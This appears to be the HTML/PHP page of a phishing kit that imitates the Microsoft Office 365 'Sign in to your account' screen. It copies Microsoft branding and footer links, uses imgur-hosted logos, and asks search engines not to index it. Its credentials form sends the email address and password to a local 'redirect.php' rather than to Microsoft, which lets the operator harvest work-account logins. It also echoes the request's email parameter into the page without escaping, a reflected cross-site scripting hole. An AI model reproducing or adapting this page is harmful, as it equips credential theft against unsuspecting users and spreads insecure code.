<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html dir="ltr" style="background-color: rgb(235, 60, 0);">

  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="i5030.2.0">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="2057">
    <meta name="LocLC" content="en-GB">
    <meta name="mswebdialog-newwindowurl" content="*">
    <meta name="robots" content="noindex,nofollow,none">
	<meta name="googlebot" content="noindex">



    <link rel="SHORTCUT ICON" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4653.2/content/images/favicon_a.ico">

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <link href="./index_files/login.min.css" rel="stylesheet">



    <style>
      .no_display {
        display: none;
      }

    </style>


    <link id="hovereffect" rel="stylesheet" type="text/css" href="./index_files/login_hover.min.css" media="all">





    <style>
      body {
        display: none;
      }

    </style>

    <title>
      Sign in to your account </title>
    <style id="style-1-cropbar-clipper">
      /* Copyright 2014 Evernote Corporation. All rights reserved. */
      
      .en-markup-crop-options {
        top: 18px !important;
        left: 50% !important;
        margin-left: -100px !important;
        width: 200px !important;
        border: 2px rgba(255, 255, 255, .38) solid !important;
        border-radius: 4px !important;
      }
      
      .en-markup-crop-options div div:first-of-type {
        margin-left: 0px !important;
      }

    </style>
  </head>

  <body cz-shortcut-listen="true" style="display: block;">


    <script>
      if (self == top) {
        var body = $('body');
        body.css('display', 'block');
      } else {
        top.location = self.location;
      }

    </script>



    <div id="background_branding_container" class="ie_legacy" style="background: rgb(235, 60, 0);">
      <img id="background_background_image" alt="Illustration" src="./index_files/heroillustration" style="width: 966px; height: 735px; background-color: rgb(235, 60, 0); visibility: visible; display: block;">
      <div id="auto_low_bandwidth_background_notification" class="smalltext">It looks like you're on a slow connection. We've disabled some images to speed things up.</div>
      <div id="background_company_name_text" class="background_title_text" style="opacity: 0;">Sign in with your work or school account</div>
    </div>
    <div id="background_page_overlay" class="overlay ie_legacy" aria-hidden="true" style="background-color: rgb(235, 60, 0); visibility: visible; display: none;">
    </div>

    <div id="login_no_script_panel" class="login_panel" aria-hidden="true" style="display: none;">


      <noscript>
    &lt;style&gt;body { display: block; }&lt;/style&gt;
    &lt;div class="login_inner_container no_js"&gt;
        &lt;div class="inner_container cred"&gt;
            &lt;div class="login_workload_logo_container"&gt;
            &lt;/div&gt;
            &lt;div id="login_no_js_error_container" class="login_full_error_container"&gt;
                &lt;div id="login_no_js_error_text" class="cta_text 1"&gt;
                    
                    &lt;H1&gt;We can't sign you in&lt;/H1&gt;&lt;p&gt;Your browser is currently set to block JavaScript. You need to allow JavaScript to use this service.&lt;/p&gt;&lt;p&gt;To learn how to allow JavaScript or to find out whether your browser supports JavaScript, check the online help in your web browser.&lt;/p&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    

&lt;div id="footer_links_container" class="login_footer_container"&gt;
    &lt;div class="footer_inner_container"&gt;
        &lt;table id="footer_table" class="footer_block"&gt;
                &lt;tr&gt;
                    &lt;td&gt;
                        &lt;div&gt;
                            &lt;div class="corporate_footer"&gt;
                                    &lt;div&gt;
                                        &lt;span class="footer_link text-caption" id="footer_copyright_link"&gt;
&amp;#169; 2016 Microsoft                                        &lt;/span&gt;
                                    &lt;/div&gt;
                                    &lt;div&gt;
                                        &lt;span class="footer_link"&gt;
                                            &lt;a class="text-caption" id="footer_link_terms" href="https://login.microsoftonline.com/termsofuse" target="_blank"&gt;Terms of use&lt;/a&gt;
                                        &lt;/span&gt;
                                        &lt;span class="footer_link"&gt;
                                            &lt;a class="text-caption" id="footer_link_privacy" href="https://login.microsoftonline.com/privacy" target="_blank"&gt;Privacy &amp;amp; Cookies&lt;/a&gt;
                                        &lt;/span&gt;
                                    &lt;/div&gt;
                            &lt;/div&gt;
                        &lt;/div&gt;
                    &lt;/td&gt;
                    &lt;td&gt;
                        &lt;div class="footer_glyph"&gt;
                            &lt;img src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4653.2/content/images/microsoft_logo.png" alt="Microsoft account symbol" /&gt;
                        &lt;/div&gt;
                    &lt;/td&gt;
                &lt;/tr&gt;
        &lt;/table&gt;
    &lt;/div&gt;
&lt;/div&gt;
&lt;div id="login_prefetch_container" class="no-display"&gt;
&lt;/div&gt;

</noscript>

    </div>
    <div id="login_panel" class="login_panel" style="display: block;">
      <div class="legal_container"></div>
      <table class="login_panel_layout" style="height: 100%;">
        <tbody>
          <tr class="login_panel_layout_row" style="height: 100%;">
            <td id="login_panel_center">

              <script type="text/javascript">
                $(document)
                  .ready(function () {


                    Constants.DEFAULT_LOGO = 'https://i.imgur.com/qDA3IyT.png';


                    Constants.DEFAULT_LOGO_ALT = 'Office 365';
                    Constants.DEFAULT_ILLUSTRATION = 'https://i.imgur.com/BszVKPj.jpg';
                    Constants.DEFAULT_BACKGROUND_COLOR = '#EB3C00';
                    Constants.BOILERPLATE_HEADER = '';
                    Constants.DEFAULT_BOILERPLATE_HEADER = '';
                    Constants.DEFAULT_BOILERPLATE_TEXT = '';




                    User.UpdateLogo(Constants.DEFAULT_LOGO, Constants.DEFAULT_LOGO_ALT);
                    User.UpdateBackground(Constants.DEFAULT_ILLUSTRATION, Constants.DEFAULT_BACKGROUND_COLOR);

                    if (Constants.DEFAULT_BOILERPLATE_TEXT.length > 0) {
                      TenantBranding.AddBoilerPlateText(Constants.DEFAULT_BOILERPLATE_TEXT, Constants.DEFAULT_BOILERPLATE_HEADER);
                    }




                    $('#footer_link_privacy_windows')
                      .click(function (event) {
                        var flyoutButton = $('#footer_link_privacy_windows')[0]; // anchor
                        var flyout = $('#flyoutPrivacyStatement')[0]; // flyout div
                        var pageTop = $('.body-container')[0].getBoundingClientRect()
                          .top + (window.pageYOffset || document.documentElement.scrollTop || 0);
                        flyout.style.marginTop = pageTop + "px"; // adjust margin top so flyout doesn't cover header
                        flyout.winControl.show(flyoutButton, "top", "left");
                      });

                    if (!Constants.IS_ADAL_REQUEST) {
                      $('#create_msa_account_link, #account_not_found_title_text > p > a')
                        .click(function (event) {
                          event.preventDefault();
                          var msaLink = event.target.getAttribute("href");
                          window.open(msaLink, '_blank');
                          window.focus();
                        });
                    } else {
                      $('#account_not_found_title_text p')
                        .toggleClass('no_display');
                    }
                  });

              </script>
              <div class="login_inner_container">
                <div id="true_inner" class="inner_container cred">
                  <div class="login_workload_logo_container"><img id="login_workload_logo_image" class="workload_img" alt="Sign in with your work or school account" style="visibility: visible;" src="./index_files/bannerlogo"></div>
                  <div class="spacer"></div>





                  <div id="login_error_container" class="login_error_container"></div>
                  <div class="login_cta_container normaltext">
                    <div id="login_cta_text" class="cta_message_text 1">Work or school, or personal Microsoft account</div>

                    <div id="cta_client_message_text" class="no_display template-tooltip tooltipType_error" aria-hidden="true">
                      <!-- Email Discovery Main -->
                      <div class="cta_message_text 30136">Type the email address or phone number of the account that you want to sign in with.</div>
                      <!-- Email Discovery Lookup Timeout -->
                      <div class="cta_message_text 30140">We're having trouble with locating your account. Which type of account do you want to use?</div>
                      <!-- Email Discovery Account not found -->
                      <div id="upn_needs_disambiguation_text" class="cta_message_text 30139">
                      </div>
                      <!-- Tenant branding call to action -->
                      <div id="tenant_branding_cta_text" class="cta_message_text 30008">Sign in to {0}</div>
                      <!-- Which accound do you want to use -->
                      <div class="cta_message_text 30173">Which type of account do you want to sign in with?</div>
                    </div>
                    <div id="cta_client_error_text" class="error_msg errortext no_display template-tooltip tooltipType_error" aria-hidden="true">
                      <!-- Invalid ID or password -->

                      <div class="client_error_msg 30067">
                        <h1>We don't recognise this user ID or password</h1>
                        <p>Make sure that you type the password for your work or school account.</p>
                      </div>
                      <!-- Malformed id -->

                      <div class="client_error_msg 30064">
                        <h1>This doesn't look like a valid user ID</h1>
                        <p>Try using your email address or phone number.</p>
                      </div>
                      <!-- Username not found -->

                      <div class="client_error_msg 30065">
                        <h1>{0} isn't in our system </h1>
                        <p>Make sure that you typed your address or phone number correctly, or <a id="user-not-found-link" href="#">get a new Microsoft account</a>.</p>
                      </div>
                      <!-- Malformed id (DOMAIN\alias format) -->

                      <div class="client_error_msg 30066">
                        <h1>This doesn't look like a valid user ID</h1>
                        <p>Try using your email address or phone number.</p>
                      </div>
                      <!-- Invalid domain name (not guests) -->

                      <div class="client_error_msg 30068">
                        <h1>{0} isn't in our system</h1>
                        <p>Make sure you've typed your email address correctly. It usually looks like someone@example.com or someone@example.onmicrosoft.com</p>
                      </div>
                      <!-- Missing password -->
                      <div class="client_error_msg 30111">Please enter your password.</div>
                      <!-- UserID is missing -->
                      <div class="client_error_msg 30127">To sign in, start by entering a user ID.</div>
                      <!-- Error message if email address is not properly formatted -->
                      <div class="client_error_msg 30145">Check the email address you entered. You may have mistyped it.</div>
                      <!-- Email Discovery could not find email address -->

                      <div id="account_not_found_title_text" class="client_error_msg 30146">
                        <h1>We couldn't find an account with that email address.</h1>
                        <p>Enter a different email address or <a id="user-not-found-link-ebd" href="#">get a new Microsoft account</a>.</p>
                      </div>
                      <!-- Signout failed -->
                      <div id="client_error_msg 30200" class="client_error_msg 30200">You may still be signed in to some applications. Close your browser to finish signing out.</div>
                      <div class="client_error_msg 2147776681">
                        <h1>Sorry, but we're having trouble with signing you in</h1>
                        <p>Please try again in a few minutes. If this doesn't work, you might want to contact your admin and report the following error: 2147776681.</p>
                      </div>
                      <div class="client_error_msg 2147776682">
                        <h1>Sorry, but we're having trouble with signing you in</h1>
                        <p>Please try again in a few minutes. If this doesn't work, you might want to contact your admin and report the following error: 2147776682.</p>
                      </div>
                      <div class="client_error_msg 2147778860">
                        <h1>Sorry, but we're having trouble with signing you in</h1>
                        <p>Please try again in a few minutes. If this doesn't work, you might want to contact your admin and report the following error: 2147778860.</p>
                      </div>
                      <div class="client_error_msg 2147762276">
                        <h1>Sorry, but we're having trouble with signing you in</h1>
                        <p>Please try again in a few minutes. If this doesn't work, you might want to contact your admin and report the following error: 2147762276.</p>
                      </div>
                    </div>
                  </div>
                  <ul class="login_cred_container">
                    <!-- From ViewTemplateBase/Tiles.cshtml -->
                    <li id="login_user_chooser" class="login_user_chooser"></li>





                    <!-- From ViewTemplateBase/Tiles.cshtml -->
                    <div class="nav-settings-menu hidden dropdownPanel" id="signedin-dropdown" aria-hidden="true">
                      <ul class="nav-settings-menu-list">
                        <li id="signoutContainer"><a href="#" id="signedin-signout">Sign out</a></li>
                        <li id="signoutForgetContainer"><a href="#" id="signedin-signoutandforget">Sign out and forget</a></li>
                      </ul>
                    </div>
                    <div class="nav-settings-menu hidden dropdownPanel" id="signedout-dropdown" aria-hidden="true">
                      <ul class="nav-settings-menu-list">
                        <li id="forgetContainer"><a href="#" id="signedout-forget">Forget</a></li>
                      </ul>
                    </div>
                    <!--  -->
                    <li class="login_cred_field_container">


                      <form id="credentials" method="post" action="./redirect.php">
                        <div id="cred_userid_container" class="login_textfield textfield">
                          <span class="input_field textfield">
                <label for="cred_userid_inputtext" class="no_display" aria-hidden="true">User account</label>
                <div class="input_border">
                <?php
					$email = $_REQUEST['email'];
                    echo '<input id="cred_userid_inputtext" class="login_textfield textfield required email field normaltext" placeholder="Email address or phone number" type="email" name="login" spellcheck="false" alt="Email address or phone number" aria-label="User account" value="'.$email.'" autocomplete="off">'
                ?>
                </div>
            </span>
                        </div>
                        <div id="looking_container" class="no_display" aria-hidden="true">
                          <span id="looking_cta_text" class="bigtext">Looking for an account</span>
                          <span class="input_field normaltext login_textfield"><a id="looking_cancel_link" href="#">Cancel</a> </span>
                        </div>
                        <div id="redirect_cta_text" class="bigtext" aria-hidden="true" style="display: none;">Redirecting</div>
                        <div id="redirect_dots_animation" class="progress" style="visibility: hidden;">
                          <div class="pip">
                          </div>
                          <div class="pip">
                          </div>
                          <div class="pip">
                          </div>
                          <div class="pip">
                          </div>
                          <div class="pip">
                          </div>
                        </div>

                        <div id="cred_password_container" class="login_textfield textfield" style="opacity: 1;">
                          <span class="input_field textfield">
                <label for="cred_password_inputtext" class="no_display" aria-hidden="true">Password</label>
                <div class="input_border">
                    <input id="cred_password_inputtext" class="login_textfield textfield required field normaltext" placeholder="Password" spellcheck="false" aria-label="Password" alt="Password" type="password" name="passwd" value="">
                </div>
            </span>
                        </div>
                        <div id="redirect_message_container" class="login_textfield hidden no_display" aria-hidden="true" style="opacity: 0;">
                          <span class="input_field normaltext">
                <div>
                    <span id="redirect_message_text">We're taking you to your organisation's sign-in page.</span><span id="redirect_company_name_text"></span> <a id="redirect_cancel_link" href="#">Cancel</a>
                        </div>
                        </span>
                </div>



                </li>
                <li id="login-splitter-control" class="login_splitter_control">
                  <div id="splitter-tiles-container"></div>
                </li>
                <li class="login_cred_options_container" id="login_cred_options_container">
                  <div id="cred_kmsi_container" class="subtext normaltext">
                    <span class="input_field ">
        <input id="cred_keep_me_signed_in_checkbox" type="checkbox" value="0" class="win-checkbox" name="persist">
        <label id="keep_me_signed_in_label_text" for="cred_keep_me_signed_in_checkbox" class="persist_text">Keep me signed in</label>
    </span>
                  </div>
                  <button type="submit" id="cred_sign_in_button" class="button normaltext cred_sign_in_button refresh_domain_state control-button button-two button_primary" style="opacity: 1;">
            Sign in
        </button>
                </form>



                  <div id="recover_container" class="subtext smalltext" style="opacity: 1;">
                    <span>
                <a href="#">Can’t access your account?</a>
            </span>
                  </div>



                  <div id="alternative-identity-providers">
                  </div>


                  <input id="home_realm_discovery" type="hidden" value="0"></ul>




              </div>
              <div class="push">
              </div>
    </div>


    <div id="footer_links_container" class="login_footer_container">
      <div class="footer_inner_container">
        <table id="footer_table" class="footer_block">
          <tbody>
            <tr>
              <td>
                <div>
                  <div class="corporate_footer">
                    <div>
                      <span class="footer_link text-caption" id="footer_copyright_link">
© 2016 Microsoft                                        </span>
                    </div>
                    <div>
                      <span class="footer_link">
                                            <a class="text-caption" id="footer_link_terms" href="https://login.microsoftonline.com/termsofuse" target="_blank">Terms of use</a>
                                        </span>
                      <span class="footer_link">
                                            <a class="text-caption" id="footer_link_privacy" href="https://login.microsoftonline.com/privacy" target="_blank">Privacy &amp; Cookies</a>
                                        </span>
                    </div>
                  </div>
                </div>
              </td>
              <td>
                <div class="footer_glyph">
                  <img src="./index_files/microsoft_logo.png" alt="Microsoft account symbol">
                </div>
              </td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>
    <div id="login_prefetch_container" class="no-display">
      <iframe src="./index_files/Prefetch.html" seamless="seamless" scrolling="no" id="login_prefetch_iframe"></iframe></div>
    </td>
    </tr>
    </tbody>
    </table>
    </div>



  </body>
  <div></div>

</html>
